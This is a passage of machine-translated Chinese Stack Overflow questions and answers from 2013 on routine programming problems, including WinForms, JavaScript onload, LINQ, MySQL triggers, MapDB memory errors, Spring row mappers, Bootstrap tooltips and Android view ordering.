停下来。

写！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T18:27:01.117

您尝试在 Elements 数组上调用 getFirst（$$ 返回元素数组！） getFirst() 方法仅在 dom mootools 元素上，它将返回他的第一个孩子，您正在寻找的是：

```
alert($$('.lastItem')[0].get('text')); 
```

# c# - 如何打开以父表单为中心的子表单？

> ID：15555144
> 
> 赞同：0
> 
> 时间：2013-03-21T18:18:35.063
> 
> 标签：c#, multithreading, winforms

我正在使我的程序多线程，因为它是 Bukkit (Minecraft) 的服务器管理器，这对于某些系统来说相当繁重。现在我面临一个小问题。当我想打开一个新的子表单时，我不能告诉中心父。它只是不做我告诉表格要做的事情。我已经找到了解决方法，但我不知道是否可以更轻松地完成，或者我是否必须更改其他内容。

这是我的自动取款机代码：
**Works**

```
private void ThreadFrmSettings()
{
    Form frmSettings = new frmSettings();
    frmSettings.StartPosition = FormStartPosition.Manual;
    frmSettings.Location = new Point(Location.X + (Width - frmSettings.Width) / 2, Location.Y + (Height - frmSettings.Height) / 2);
    frmSettings.ShowDialog();
} 
```

**不工作**

```
var frmSettings = new frmSettings();
frmSettings.ShowDialog(); 
```

这种行为正常吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:31:05.013

的`StartPosition = FormStartPosition.CenterScreen;` 财产`From`呢？

IE

```
 public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
        StartPosition = FormStartPosition.CenterScreen;

        Form frmSettings = new Form();
        frmSettings.Width = 300;
        frmSettings.Height = 200;
        frmSettings.StartPosition = FormStartPosition.CenterScreen;
        //frmSettings.Location = new Point(Location.X + (Width - frmSettings.Width) / 2, Location.Y + (Height - frmSettings.Height) / 2);
        frmSettings.ShowDialog();

    }
} 
```

注意：`frmSettings.Show();` 给出不同的结果，在这种情况下，窗口不会位于中心。

这是带有线程/任务的示例

```
public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            StartPosition = FormStartPosition.CenterScreen;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Task.Factory.StartNew(() => {

                Form frmSettings = new Form();
                frmSettings.Width = 300;
                frmSettings.Height = 200;
                frmSettings.StartPosition = FormStartPosition.CenterParent;

                frmSettings.ShowDialog();

            } );   

        }
    } 
```

![在此处输入图像描述](../Images/c2934041f60fdfa49b511ffcebaeb548.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T20:57:35.697

我遵循了 MadScienceDreams 的建议并得到了我想要的结果，这就是成功的代码：

```
this.Invoke(new MethodInvoker(()=>ThreadFrmSettings()) 
```

# javascript - 在页面加载时设置 div 的背景

> ID：15555146
> 
> 赞同：0
> 
> 时间：2013-03-21T18:18:49.240
> 
> 标签：javascript, image, html, onload

我有一个带有 2 个按钮的页面，可以将 div 中的图像从一个交换到另一个。我希望页面加载时在 div 中有一个图像，这是我的尝试：

脚本：

```
<script type="text/javascript">
function startPic(){
    document.getElementById('imageRoll').style.backgroundImage="url(balanceSheet.jpg)";
}
function changeStyle1(){
    document.getElementById("imageRoll").style.backgroundImage="url(balanceSheet.jpg)";
}
function changeStyle2(){
    document.getElementById("imageRoll").style.backgroundImage="url(incomeStatement.jpg)";
}
document.body.onload = startPic();
</script> 
```

HTML：

```
<div style="width:auto; float: left;">
<div style="width:200px; height:30px; padding: 5px;"><a href="#" onmouseover="changeStyle1()"><img style="border: 0px; vertical-align:middle; padding: 5px;" onmouseover="this.src='standardButton_over.png'" onmouseout="this.src='standardButton.png'" src="standardButton.png" /></a>See balance sheet</div>
<div style="width:200px; height:30px; padding: 5px;"><a href="#" onmouseover="changeStyle2()"><img style="border: 0px; vertical-align:middle; padding: 5px;" onmouseover="this.src='standardButton_over.png'" onmouseout="this.src='standardButton.png'" src="standardButton.png" /></a>See income statement</div>
</div>
<div id="imageRoll" style="background-repeat:no-repeat; width:335px; height:465px; float: left;"></div> 
```

使用上面的代码，交换完全按照预期执行，如果在 startPic 函数中设置了警报，则它在图像嵌入线之前有效，但如果它在图像嵌入线下方，则警报不起作用。由于某种原因，startPic 函数中的图像嵌入线不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:22:56.440

附加事件时删除括号，否则您正在调用该函数而不是附加它：

```
// good - attaches the function to the onload of the body
document.body.onload = startPic;
// bad - won't work as you would expect
document.body.onload = startPic(); 
```

你总是可以用事件监听器做事；就像是：

```
var load = function(fn){
    var d = document;
    if(d.addEventListener) {
        d.addEventListener("DOMContentLoaded", fn, false);
    } else {
        d.attachEvent("onreadystatechange", function(){
            if(d.readyState === "complete") {
                fn();
            }
        });
    }
};
load(startPic); 
```

这将很好地跨浏览器工作。

# c# - 检查其他数据类型的值后设置一个值以列出数据类型

> ID：15555147
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:18:50.173
> 
> 标签：c#, linq, list, where, lookup

我有一个包含用户会话数据的列表。更新会话数据中保存的信息后，我需要将会话数据设置为此新信息。试图做一个像这样的 LINQ 查询，用户是全局会话数据，它持有个人，即列表。所以我需要在地址和城市等于这个的列表中查找，一旦发现我需要将状态设置为等于这个，它们只会成为列表中与之匹配的一条记录。

```
user.Individual = user.Individual.Where(a => a.address == "ABC" && a.city == "MIAMI").ToList() 
```

因此，在上面我可以查看列表以找到地址和城市等于某物的位置。我该如何设置`a.State=="FL"`，`Where`如果这两个是真的/在列表中找到。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:23:17.280

您只需将 && 添加到 where agian ？

```
user.Individual = user.Individual.Where(a => (a.address == "ABC" && a.city == "MIAMI") && a.State=="FL").ToList() 
```

编辑你的集合是什么意思？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:26:35.167

试试这个（假设你有一个人匹配你的 where 子句）：

```
//get the user
var idividual = user.Individual.SingleOrDefault(a => a.address == "ABC" && a.city == "MIAMI");

if(idividual != null)
{
   idividual.State = "FL";

   //persist user in DB or elsewhere
} 
```

如果结果集中有 1 个以上的项目，请执行以下操作：

```
//get the user
var idividuals = user.Individual.Where(a => a.address == "ABC" && a.city == "MIAMI").ToList();

individuals.ForEach(i=>i.State="FL"); 
```

# mysql - Apache 的 htdocs 文件夹发生了什么变化？

> ID：15555148
> 
> 赞同：1
> 
> 时间：2013-03-21T18:18:52.297
> 
> 标签：mysql, apache, tomcat, phpmyadmin

我已经在互联网上搜索了这个问题的答案，所以我想我会在这里提出这个问题。我已经安装了 Apache Tomcat 和 MySQL。我现在想安装 phpmyadmin 来使用我的 mySQL 数据库。所有说明都说要在 Apache 文件夹中的“htdocs”文件夹中安装 phpmyadmin。我曾多次尝试安装和重新安装 Apache，但没有一个安装带有 htdocs 文件夹。有谁知道为什么，它在哪里，或者没有它我如何安装 phpmyadmin？我可以只创建一个名为 htdocs 的文件夹，还是其中有一些我遗漏的重要内容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:20:54.247

Tomcat 是一个 JSP 服务器。对于 Java 应用程序，而不是 PHP。我认为您想下载并安装常规的 Apache 而不是 Apache Tomcat。

[http://httpd.apache.org/download.cgi](http://httpd.apache.org/download.cgi)

# twitter-bootstrap - Twitter bootstrap 元素中间位置错误

> ID：15555151
> 
> 赞同：0
> 
> 时间：2013-03-21T18:18:56.560
> 
> 标签：twitter-bootstrap, tooltip, placement

我通过 ajax 调用在页面中放置了一些 html 元素，所以我这样调用工具提示：

```
$(document).on('hover','.has-tooltip',function(){
    $(this).tooltip('show');
}); 
```

我也试过这个：

```
$('body').tooltip({
    selector: '[rel=tooltip]'
}); 
```

但问题仍然存在。

问题是工具提示恰好显示在触发元素的中间，而不是靠近它的外边框。

令人讨厌的是，通过这种方式，工具提示部分隐藏了触发元素。

是否有可能是工具提示被调用的事实`.on()`导致了问题？

有什么解决办法吗？我如何调整从工具提示显示的元素到的距离？

这是HTML

```
<a 
    style="display:block" 
    data-placement="left" 
    data-original-title="Add" 
    class="has-tooltip pull-right icon-black" 
    rel="tooltip" href="#"
>
<i class="icon-plus"></i> 
</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:31:56.870

为什么不将工具提示附加到 ajax 调用成功？

```
$.ajax({
    success: function(){
        $('.has-tooltip').tooltip();
    }
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:53:59.030

在您的第一个代码中，您使用`hover`的是不存在的事件。相反，您必须使用`mouseenter`或`mouseover`事件。

在您的第二个代码中，您添加`tooltip()`的是`body`标签而不是链接。

我将您的代码更改为以下代码，现在它可以工作了。[你可以在这里](http://jsfiddle.net/faridv/HV33T/)看到一个现场演示：

```
$('body').delegate('a.has-tooltip', 'mouseenter', function() {
    $(this).tooltip('show');
}); 
```

随时问更多问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-26T21:35:57.060

我猜这是一个引导错误。我已经更新到 2.3.1，问题（部分）解决了（在某些情况下仍然会出现，但我不知道为什么）。

2.3.1 的更改日志说：

```
fix delegated data-attrs for popover/tooltip 
```

# jakarta-ee - 未记录时在拦截器中重定向

> ID：15555156
> 
> 赞同：0
> 
> 时间：2013-03-21T18:19:23.517
> 
> 标签：jakarta-ee, jsf-2, ejb, interceptor

我试图在我的拦截器中使用@aroundInvoke，检查一些validationX以继续执行该方法，否则将用户重定向到特定的JSF页面。

```
@AroundInvoke
public Object myInterceptor(InvocationContext invocation) throws Exception {
        if(validationX){//it passes the validation so proceed
            return invocation.proceed();    
        }else{//it doesnt passes the validation so go to 
            //DO SOMETHING TO REDIRECT TO SPECIFIC JSF
        }

    } 
```

我试过了：

*   使用“JSF?faces-redirect=true”返回字符串 ----- 我得到转换错误（字符串到方法应该返回的任何内容）。
*   FacesContext.getCurrentInstance().getExternalContext().dispatch("/JSF.jsf"); ----- 我用 getCurrentInstance 方法得到 nullPointerException。
*   FacesContext.getCurrentInstance().getExternalContext().redirect("/JSF.jsf"); --------同样的NullPointerException。
    *   使用 HttpServletRequest 和 HttpServletResponse 生成响应，但我得到 NullPointer 异常。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:26:51.057

Java EE 拦截器不是为此而设计的。它旨在用于决定是否继续调用当前 CDI/EJB bean 方法（并在必要时抛出异常以中止它），和/或控制/操作其返回值。它不打算充当 JSF 控制器。为此，应该使用普通的 JSF 托管 bean。

或者，如果这涉及异常情况，那么您应该只抛出一个特定的异常并在该异常类型上注册一个`<error-page>`in 。`web.xml`如果您可以挂钩特定的 URL 而不是特定的方法调用，另一种方法是在一个简单的[servlet 过滤器](https://stackoverflow.com/tags/servlet-filters/info)中执行该工作。

[由于您错误地](https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem)认为这是正确解决方案的具体功能要求从问题中不清楚，因此无法给出更详细的答案。

# mysql - 通过 mySQL 触发器将行插入另一个表

> ID：15555157
> 
> 赞同：0
> 
> 时间：2013-03-21T18:19:25.107
> 
> 标签：mysql, triggers

尝试创建触发器以将行从一个表插入另一个表时出现语法错误...更新过程中的日期和时间。这是我的查询：

```
INSERT INTO `second_table` (field1, field2, field3, field4, field5, field6, field7, field8, field9, field10, field11, field12)
  (SELECT `field1`, `field2`, `field3`, `field4`, `field5`, `field6`, `field7`, `field8`, `field9` FROM `first_table` WHERE `field1` = NEW.`field1`), CURDATE(), NOW(), (SELECT `field12` FROM `second_table` WHERE `field1` = NEW.`field1`); 
```

此触发器将在`first_table`更新时运行。我不确定这是否是完成任务的正确方法。为简单起见，我概括了字段和表名称。

编辑：

两个表之间的列是相同的。我只想更新触发发生的日期和时间。这有效，但显然只是复制了以前的日期和时间：

```
INSERT INTO `second_table` (SELECT * FROM `first_table` WHERE `field1` = NEW.`field1`); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T16:21:44.553

尝试：

```
INSERT INTO `second_table` (field1, field2, field3, field4, field5, field6, field7, field8, field9, field10, field11, field12)
 (SELECT `field1`, `field2`, `field3`, `field4`, `field5`, `field6`, `field7`, `field8`, `field9`, CURDATE() AS `field10`, NOW() AS `field11`, `field12` FROM `first_table` WHERE `field1` = NEW.`field1`); 
```

# c - 我需要在 C 中解析一些月份名称

> ID：15555159
> 
> 赞同：0
> 
> 时间：2013-03-21T18:19:32.250
> 
> 标签：c, parsing

用户输入生日：月、日、年。当然，它需要是字符串格式，因为整数不够好。无论如何，我需要找出特定生日是一年中的哪一天（所以 1994 年 5 月 31 日是第 151 天）。但是，在执行此操作之前，我需要能够将字符串“MAY”转换为某个整数。我如何轻松解析这些？我一直在尝试涉及 strcmp() 和 switch 语句或大量 ifs 的巨大混乱，但事情似乎并不想工作。有没有更简单的方法而不改变程序的规格？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:31:39.627

这是一种方法，使用 1..12 作为月份编号，使用 0 作为无效月份名称：

```
int GetMonth( char *name )
{
   static char *szMonth[13] =
   {
      "",
      "jan", "feb", "mar", "apr", "may", "jun",
      "jul", "aug", "sep", "oct", "nov", "dec"
   };
   int m;

   for( m=12; m>0; m-- )
   {
      if( 0 == strcasecmp( name, szMonth[m] ) )
      {
         break;
      }
   }
   return m;
} 
```

这对您来说太丑陋或效率低下吗？它对我有用，而且简单的零失败案例也很方便。您总是可以通过使用带有名称/索引对的数据结构来加快速度，按名称排序并使用二进制搜索来查找月份并返回索引......但是是否值得额外的代码来保存一些比较? 有时是，有时不是。

- 编辑 -

如果您不喜欢`strcasecmp`，可以将其替换为以下内容：

```
if( (tolower(name[0]) == szMonth[m][0])
 && (tolower(name[1]) == szMonth[m][1])
 && (tolower(name[2]) == szMonth[m][2]) ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:39:55.830

只需检查一组月份名称即可。

```
static const char *months[] = {"JAN", "FEB", "MAR", ...};

int get_month_number(const char *month) {
    int i;
    for(i=0; i<12; i++)
        if(!strcmp(months[i], month))
            return i;
    return -1;
} 
```

如果月份无效，则返回 -1（规范失败代码），否则返回 0-11 月份。

# java - 内存不足 w/mapdb

> ID：15555160
> 
> 赞同：1
> 
> 时间：2013-03-21T18:19:38.083
> 
> 标签：java, mapdb

测试 mapdb 时出现内存不足错误。鉴于该项目的整个想法是将数据结构序列化到磁盘并避免内存问题，我认为我做错了什么。任何想法我做错了什么？还是有错误？

```
 @Test
    public void testLarge() throws Exception {
        final HTreeMap<UUID, String> storage = DBMaker.newTempHashMap();

        String string = createDataSize(250);

        ArrayList<UUID> keys = new ArrayList<>();
        for (int i = 0; i < 320000; i++) {
            final UUID key = UUID.randomUUID();
            storage.put(key, string);
            keys.add(key);
        }

        for (UUID key : keys) {
            assertNotNull(storage.get(key));
        }

        for (UUID key : keys) {
            storage.remove(key);
        }

        assertEquals("nothing left", 0, storage.size());
    }

    /**
     * Creates a message of size @msgSize in KB.
     */
    private static String createDataSize(int msgSize) {
        // Java chars are 2 bytes
        msgSize = msgSize / 2;
        msgSize = msgSize * 1024;
        StringBuilder sb = new StringBuilder(msgSize);
        for (int i = 0; i < msgSize; i++) {
            sb.append('a');
        }
        return sb.toString();
    }
} 
```

堆栈跟踪。我的函数中的第 29 行对应于“assertNotNull(storage.get(key));” 线。

```
java.lang.OutOfMemoryError: Java heap space
    at java.util.Arrays.copyOf(Arrays.java:2367)
    at java.lang.String.<init>(String.java:168)
    at org.mapdb.SerializerBase.deserializeString(SerializerBase.java:724)
    at org.mapdb.SerializerBase.deserialize(SerializerBase.java:932)
    at org.mapdb.SerializerBase.deserialize(SerializerBase.java:731)
    at org.mapdb.HTreeMap$1.deserialize(HTreeMap.java:134)
    at org.mapdb.HTreeMap$1.deserialize(HTreeMap.java:123)
    at org.mapdb.StorageDirect.recordGet2(StorageDirect.java:536)
    at org.mapdb.StorageDirect.get(StorageDirect.java:201)
    at org.mapdb.EngineWrapper.get(EngineWrapper.java:50)
    at org.mapdb.AsyncWriteEngine.get(AsyncWriteEngine.java:163)
    at org.mapdb.EngineWrapper.get(EngineWrapper.java:50)
    at org.mapdb.CacheHashTable.get(CacheHashTable.java:85)
    at org.mapdb.HTreeMap.get(HTreeMap.java:387)
    at com.sample.StorageTest.testLarge(StorageTest.java:29)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41)
    at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
    at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:263)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:69)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:48)
    at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
    at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
    at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:292) 
```

根据 unholysampler 的建议，我进行了以下更改以解决问题。

```
diff -r 35918e46551a src/test/java/com/sample/StorageTest.java
--- a/src/test/java/com/sample/StorageTest.java Thu Mar 21 13:40:16 2013 -0600
+++ b/src/test/java/com/sample/StorageTest.java Thu Mar 21 13:42:24 2013 -0600
@@ -16,7 +16,9 @@

     @Test
     public void testLarge() throws Exception {
-        final HTreeMap<UUID, String> storage = DBMaker.newTempHashMap();
+        File tmpFile = File.createTempFile("largeTest", null);
+        DB db = DBMaker.newFileDB(tmpFile).deleteFilesAfterClose().journalDisable().make();
+        final HTreeMap<UUID, String> storage = db.getHashMap("name");

         String string = createDataSize(250);

@@ -25,6 +27,9 @@
             final UUID key = UUID.randomUUID();
             storage.put(key, string);
             keys.add(key);
+            if (i%100==0) {
+                db.commit();
+            }
         }

         for (UUID key : keys) { 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:29:50.820

文档显示有一种`commit()`方法。

```
db.commit();  //persist changes into disk 
```

`testLarge()`从不调用`commit()`，所以还没有持久化任何东西。

您也没有调用`close()`，因此当您移动到另一个测试时，地图可能仍在内存中。

注意：我从来没有使用过这个库，但这是我最好的猜测。

# java - 将对象列表映射到对象的 ParameterizedRowMapper

> ID：15555163
> 
> 赞同：3
> 
> 时间：2013-03-21T18:19:52.720
> 
> 标签：java, spring, spring-mvc, parameterized, sqlresultsetmapping

我正在尝试在 ParameterizedRowMapper 中设置父列表，这是如何编写或处理的。我有两个对象，一个用于父对象，一个用于子对象，但是子对象包含一个列表每个子对象的父对象都存储在数据库中的单独表中，并且映射为 1 - 多。

父母的记录选择将在单独的 ResultSet 中完成。映射是否必须单独完成（*单独的 ParameterizedRowMapper*），如果是这样，我将如何编写**ParameterizedRowMapper**这是如何编写 ParameterizedRowMapper 以容纳列表项的主要**问题**。

**参数化行映射器**

```
public static class ChildrenMapper implements ParameterizedRowMapper<Children>{         

         public Children mapRow(ResultSet rs, int rowNum) throws SQLException {
                Children child = new Children();
                child.setFirstName(rs.getString("firstName"));
                child.setLastName(rs.getString("lastName"));
                    //a child can have many Parents or gaurdians
                child.setParent(List<Parent>);                  

                return child;
            }       
    } 
```

根据我的研究，我发现我需要使用**ResultSetExtractor**，但是我对它的使用有疑问。我是否在设置父级时将其集成到班级中？有人可以指导我如何以正确的方式完成

**儿童.java**

```
Public class Children(){
int cid;
String firstName;
String lastName;
List<Parent>parents;
..

//getters/setters

} 
```

**父类.java**

```
Public class Parent(){
 int pid;
String firstName;
String lastName;
..

//setters/getters
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-24T11:47:07.690

我将展示如何为典型的一对多示例执行此操作，您可以将其调整为您的 vo 类/表。

订单类

```
public class Order {
    private Long orderId;
    private String user;
    private List<LineItem> items;
    // Getter / setter omitted
} 
```

物品类别

```
public class LineItem {
    private Long lineItemId;
    private String product;
    private int quantity;
    // Getter / setter omitted
} 
```

每个类使用两个行映射器，然后使用结果集提取器将多行转换为一个订单+行项目

订单库

```
public final static RowMapper<Order> orderMapper = ParameterizedBeanPropertyRowMapper.newInstance(Order.class);
public final static RowMapper<LineItem> lineItemMapper = ParameterizedBeanPropertyRowMapper.newInstance(LineItem.class);

public Order findOrderWithItems(Long orderId) {
    return jdbcTemplate.query("select * from orders, line_item "
            + " where orders.order_id = line_item.order_id and orders.order_id = ?", 
            new ResultSetExtractor<Order>() {
        public Order extractData(ResultSet rs) throws SQLException, DataAccessException {
            Order order = null;
            int row = 0;
            while (rs.next()) {
                if (order == null) {
                    order = orderMapper.mapRow(rs, row);
                }
                order.addItem(lineItemMapper.mapRow(rs, row));
                row++;
            }
            return order;
        }

    }, orderId);
}

public List<Order> findAllOrderWithItmes() {
    return jdbcTemplate.query("select * from orders, line_item "
            + " where orders.order_id = line_item.order_id order by orders.order_id",
            new ResultSetExtractor<List<Order>>() {
                public List<Order> extractData(ResultSet rs) throws SQLException, DataAccessException {
                    List<Order> orders = new ArrayList<Order>();
                    Long orderId = null;
                    Order currentOrder = null;
                    int orderIdx = 0;
                    int itemIdx = 0;
                    while (rs.next()) {
                        // first row or when order changes
                        if (currentOrder == null || !orderId.equals(rs.getLong("order_id"))) {
                            orderId = rs.getLong("order_id");
                            currentOrder = orderMapper.mapRow(rs, orderIdx++);
                            itemIdx = 0;
                            orders.add(currentOrder);
                        }
                        currentOrder.addItem(lineItemMapper.mapRow(rs, itemIdx++));
                    }
                    return orders;
                }

            });
} 
```

# javascript - 谷歌 api 示例不起作用

> ID：15555165
> 
> 赞同：0
> 
> 时间：2013-03-21T18:20:01.377
> 
> 标签：javascript, google-api

我正在尝试运行以下 Google Api 示例：

```
<:html:>
  <:body:>
    <:div id='content':>
      <:h1:>Events<:/h1:>
      <:ul id='events':><:/ul:>
    <:/div:>
    <:a href='#' id='authorize-button' onclick='handleAuthClick();':>Login<:/a:>

    <:script:>

var clientId = redacted; 
var apiKey = redacted;
var scopes = 'https://www.googleapis.com/auth/calendar';

      function handleClientLoad() {
  gapi.client.setApiKey(apiKey);
  window.setTimeout(checkAuth,1);
  checkAuth();
}

function checkAuth() {
  gapi.auth.authorize({client_id: clientId, scope: scopes, immediate: true},
      handleAuthResult);
}

function handleAuthResult(authResult) {
  var authorizeButton = document.getElementById('authorize-button');
  if (authResult) {
    authorizeButton.style.visibility = 'hidden';
    makeApiCall();
  } else {
    authorizeButton.style.visibility = '';
    authorizeButton.onclick = handleAuthClick;
   }
}

function handleAuthClick(event) {
  gapi.auth.authorize(
      {client_id: clientId, scope: scopes, immediate: false},
      handleAuthResult);
  return false;
}
function makeApiCall() {
  gapi.client.load('calendar', 'v3', function() {
    var request = gapi.client.calendar.events.list({
      'calendarId': 'primary'
    });

    request.execute(function(resp) {
      for (var i = 0; i <: resp.items.length; i++) {
        var li = document.createElement('li');
        li.appendChild(document.createTextNode(resp.items[i].summary));
        document.getElementById('events').appendChild(li);
      }
    });
  });
}
    <:/script:>
    <:script src="https://apis.google.com/js/client.js?onload=handleClientLoad":><:/script:>
  <:/body:>
<:/html:> 
```

每当我运行该文件时，我都会收到两个错误：

gapi.client 对象为 null 或未定义

window.sessionStorage.length 对象为 null 或未定义

对于最后一个错误，它将此网址作为来源： [https://apis.google.com/ */scs/apps-static/* /js/k=oz.gapi.nl.4xKjGS6fluU.O/m=client/am= QQ/rt=j/d=1/rs=AItRSTMdnq2AHV2okN-h3tZllkPQibG86w/cb=gapi.loaded_0](https://apis.google.com/_/scs/apps-static/_/js/k=oz.gapi.nl.4xKjGS6fluU.O/m=client/am=QQ/rt=j/d=1/rs=AItRSTMdnq2AHV2okN-h3tZllkPQibG86w/cb=gapi.loaded_0)

我正在运行 IE8，有人知道出了什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-19T11:34:25.130

```
function handleClientLoad() {
  gapi.client.setApiKey(apiKey);
  window.setTimeout(checkAuth,1);
  checkAuth();
} 
```

你打`checkAuth()`了两次电话。也许这`setTimeout()`是有效响应所必需的？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-10T10:58:28.113

我注意到来自官方文档页面的相同示例（如 hello world）[here](https://developers.google.com/picker/docs/#hiworld)

声明使用变量：

```
 // The Browser API key obtained from the Google Developers Console.
  var developerKey = 'xxxxxxxYYYYYYYY-12345678';

  // The Client ID obtained from the Google Developers Console. Replace with your own Client ID.
  var clientId = "1234567890-abcdefghijklmnopqrstuvwxyz.apps.googleusercontent.com"

  // Scope to use to access user's photos.
  var scope = ['https://www.googleapis.com/auth/photos']; 
```

但是如果使用浏览器 API 密钥，developerKey 变量会返回错误，即 API 无法访问，并且在创建服务器密钥并使用它时一切正常。

# css - 在我的 css 中应用 light open sans 字体的问题

> ID：15555166
> 
> 赞同：0
> 
> 时间：2013-03-21T18:20:07.070
> 
> 标签：css, fonts, font-face

我在使用 Open Sans 字体的 css 中有一个大问题

问题是我想看到一个带有（浅）开放无字体的白色短语，而不是仅在使用白色时才显示为粗体！但是，当我用黑色或其他颜色写相同的短语时，它看起来很轻。有任何想法吗 ？

这是此链接中的代码：

[http://shrib.com/ILjxuPtM](http://shrib.com/ILjxuPtM)

请测试一下，告诉我什么是错的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:56:53.377

[这是一篇关于字体渲染的文章。](http://blog.typekit.com/category/type-rendering/)

> CSS`color`是另一个因素。文本颜色和背景颜色之间的不同对比度可以显着改变字体的外观。较低的对比度意味着抗锯齿看起来更微妙——从前景（类型颜色）到背景的渐变步骤不那么引人注目。
> 
> **Light-on-dark 文本往往看起来比 dark-on-light 更厚**，因此在这些情况下，较低的对比度会产生更大的差异。

我想您可以简单地使用该`font-weight`属性来调整字体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-12T10:33:14.850

Mac 上的抗锯齿功能使 Open Sans 中深色背景上的浅色文本显得更粗。您可以将字体平滑选项调整为子像素以外的其他选项以避免这种情况。

我使用 Photoshop 在白色背景上以 50% 的不透明度在具有相同文本但在深色背景上浅色的图层顶部堆叠一层深色文本。如您所见，深色文本周围有一条白色边缘，考虑到它们同样粗体，不应该存在。

[![](../Images/0308bbe3c4be6931a99fd70ade65a42a.png)](https://i.stack.imgur.com/Ni5Cj.png)

# android - Android - 如何将后续视图发送回

> ID：15555170
> 
> 赞同：4
> 
> 时间：2013-03-21T18:20:23.870
> 
> 标签：android, android-layout, android-view

我正在向 LinearLayout 添加一些视图，顶部有轻微重叠，代码如下：

```
viewHolder.linearLayout.removeAllViews();
for (int i = 0; i < conversation.getPreviousMessages().length; i++) {
    View messageView = layoutInflater.inflate(R.layout.layout_previous_message_row, null);

    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
    layoutParams.setMargins(0, -5, 0, 0);

    viewHolder.linearLayout.addView(messageView, layoutParams);
} 
```

在这段代码中，一些视图按 A、B、C 的顺序添加到布局中，其中 A 在后面，C 在前面。

我想颠倒顺序，使A在前面，C在后面。

我试过[这个](http://abhishek347.wordpress.com/2012/02/22/android-development-bringtofront-and-sendtoback-on-view/)，但没有任何反应。

我怎样才能做到这一点？拜托，你们能给我一些代码吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:28:31.410

如果这是您要问的问题，则可以更改视图的 z 顺序。如果需要，您通常可以获得在该类中使用 View.bringToFront() 功能的效果。

[View.bringToFront](http://developer.android.com/reference/android/view/View.html#bringToFront%28%29)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T00:39:15.880

在墙上打了几下之后，我终于找到了解决方案：

1.- 我将布局从 LinearLayout 更改为 RelativeLayout，因为bringChildToFront 在 LinearLayout 中有一个奇怪的行为。

2.- 将视图添加到RelativeLayout 后，我​​向后迭代视图并制作了一个bringChildToFront。

这是代码：

```
for (int i = 0; i < conversation.getPreviousMessages().length; i++) {
     View messageView = layoutInflater.inflate(R.layout.layout_previous_message_row, null);
     messageView.setId(99+i);

     viewHolder.relativeLayout.addView(messageView);

     if (i > 0) {
         RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
         layoutParams.setMargins(0, -5, 0, 0);
         layoutParams.addRule(RelativeLayout.BELOW, 99+i-1);

         messageView.setLayoutParams(layoutParams);
     }
 }

 for (int i = viewHolder.relativeLayout.getChildCount() - 1; i >= 0; i--) {
     viewHolder.relativeLayout.bringChildToFront(viewHolder.relativeLayout.getChildAt(i));
 } 
```

我希望它可以帮助某人。

# javascript - KineticJS - 如何一次转换 2 个形状？

> ID：15555171
> 
> 赞同：0
> 
> 时间：2013-03-21T18:20:25.163
> 
> 标签：javascript, canvas, kineticjs, transition

这是代码：http: [//jsfiddle.net/MTDpC/](http://jsfiddle.net/MTDpC/)

```
function drawArrow(firstShape, lastShape){

        var group = new Kinetic.Group();
        group.previousShape = firstShape;
        group.nextShape = lastShape;

